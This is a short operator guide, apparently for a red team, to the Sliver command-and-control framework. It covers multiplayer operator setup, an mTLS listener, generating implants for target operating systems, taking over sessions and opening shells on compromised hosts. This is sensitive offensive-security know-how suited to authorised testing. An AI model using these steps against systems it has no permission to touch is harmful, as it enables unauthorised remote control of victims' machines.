# 1. Administrating Sliver

1. Connect to the server on the host that is installed:
```bash
sliver
```
2. Enable Multiplayer mode, so that other users can connect to the sliver server
```bash
multiplayer
```
3. Create new operators (do this for each team member):
```bash
multiplayer
new-operator --name <operator_name> --lhost <sliver_server_ip>
```

This will generate:
- A config file for the operator that will need to be passed to other operators
- Certificates for authentication

# 2. Create a Listener

This is the listener that will catch the payload from our implant and give us the persistent access. We will create an `mtls` listener. You can also create an `http`, `https`, and `dns`.
```bash
mtls
```

# 3. Generating Implants

To create a implant, use the generate command:
```bash
generate --mtls --ip <SLIVER_IP> --os <Target_OS>
```
    --mtls: Specifies mutual TLS encryption.
    --ip: The IP address of your Sliver server.
    --os: Target operating system (e.g., windows, linux, macos).
    --save: OPTIONAL - You can use the save option to save to an specific path in your vm (e.g, /home/ubuntu).
    
It will give usually save the payload on your `/home/ubuntu` under a random name. It might look like this "RANDOM_NAME"

# 4. Interact with the Target

Once the implant is delivered and executed on the target, you’ll see the session appear in the Sliver client interface. Interact with the target by selecting the session:
This command will display all sessions:
```bash
sessions
```
You can interact with an specific sessions with:
```
use <session_id>
```

# 5. Execute Commands

Use Sliver commands to execute tasks on the compromised system:

help    # View available commands
shell   # Open a shell on the target system

# 6. Operator Configuration

> [!NOTE]  
> You will need to obtain the configuration file from the sliver server admin

Operators need to:
1. Install the Sliver client on their machine:
    1. Download the latest sliver client binary for their linux host https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux .
    2. Copy the binary into `/usr/local/bin` so that you can just type `sliver` from the cli and it will connect you. 
    ```bash
    cp <PATH_OF_DOWNLOADED_SLIVER_CLIENT_FILE> /usr/local/bin
    ```
3. Copy their configuration file to `~/.sliver/configs/`
    1. If the `~/.sliver/configs` folder doesn't exist. Create it.
5. Connect to the server using:
```bash
sliver
```
You should be able to connect to the sliver server now as your operator.

# 7. Common Commands

List all operators
```bash
operators
```
Remove an operator
```bash
remove-operator <operator_name>
```
List active sessions
```bash
sessions
```

Switch between sessions
```bash
use <session_id>
```

## Troubleshooting

1. If the service fails to start:
   - Check logs: `journalctl -u sliver.service`
   - Verify permissions on config directory
   - Ensure required ports are open

2. Connection issues:
   - Verify operator config is correctly placed
   - Check firewall rules
   - Ensure certificates are valid

## Additional Resources

- [Official Sliver Documentation](https://sliver.sh/docs)
- [GitHub Repository](https://github.com/BishopFox/sliver)
- [Security Considerations](https://sliver.sh/docs?name=Security)
